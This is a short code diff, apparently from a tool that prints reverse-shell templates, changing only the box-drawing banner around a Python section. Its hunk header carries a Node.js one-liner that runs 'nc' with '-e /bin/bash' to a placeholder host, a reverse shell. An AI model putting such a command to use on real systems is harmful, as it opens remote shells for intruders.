@@ -307,7 +307,7 @@ x('child_process').exec('nc xxx yyy -e /bin/bash')
             shells.append(
                 r"""
 
-╔PYTHON═════════════════════════════════════════════"""
+╔PYTHON════════╦════════════════════════════════════"""
             )
         shells.append(
             r"""
